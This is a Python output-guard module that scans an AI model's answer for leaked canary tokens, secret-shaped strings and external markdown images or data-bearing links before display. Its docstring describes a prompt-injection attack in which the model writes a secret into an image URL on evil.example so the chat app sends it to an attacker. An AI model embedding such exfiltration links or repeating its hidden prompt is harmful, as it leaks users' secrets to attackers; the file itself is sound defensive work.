"""
OUTPUT GUARD: checks what the AI is about to SAY, after the model has answered.

Why: some attacks do not need a tool. They make the model write the stolen data into its own answer,
for example as a markdown image  ![x](https://evil.example/log?data=SECRET)  which many chat apps load
automatically, sending the secret to the attacker. Others make the model repeat its hidden prompt.

We block when the answer contains:
  1. a canary token (a secret marker we planted in the system prompt)  -> system prompt leak
  2. something shaped like a secret (API keys, passwords, private keys)
  3. an external markdown image, or an external link that carries data in its query string
Plain links to other sites (for example a source link) are allowed.
"""
import re
from urllib.parse import urlparse

_URL = re.compile(r"https?://[^\s)\]>\"']+", re.I)
_MD_IMG = re.compile(r"!\[[^\]]*\]\(\s*(https?://[^)\s]+)", re.I)
SECRET_PATTERNS = {
    "api key (sk-...)": re.compile(r"\bsk-[A-Za-z0-9_-]{8,}"),
    "AWS access key": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    "GitHub token": re.compile(r"\bgh[pousr]_[A-Za-z0-9]{20,}"),
    "private key block": re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    "password assignment": re.compile(r"(?<![A-Za-z])(?:password|passwd|pwd|api[_-]?key|secret)\s*[:=]\s*\S{4,}", re.I),
}


def _host_ok(url: str, allowed) -> bool:
    host = (urlparse(url).hostname or "").lower()
    return any(host == d or host.endswith("." + d) for d in allowed)


def check_output(text: str, canaries=(), cfg=None):
    """Return (action, reason): action is 'allow' or 'block'."""
    cfg = cfg or {}
    allowed = [d.lower() for d in cfg.get("allowed_domains", [])]
    low = text or ""
    for c in canaries:
        if c and c.lower() in low.lower():
            return "block", "system prompt leak (canary token found in the answer)"
    if cfg.get("block_secrets", True):
        for name, pat in SECRET_PATTERNS.items():
            if pat.search(low):
                return "block", f"possible secret in the answer ({name})"
    if cfg.get("block_external_urls", True):
        for url in _MD_IMG.findall(low):
            if not _host_ok(url, allowed):
                return "block", "external image in the answer (data exfiltration channel)"
        for url in _URL.findall(low):
            if not _host_ok(url, allowed) and urlparse(url).query and len(urlparse(url).query) >= 8:
                return "block", "external link carrying data in its query string"
    return "allow", ""
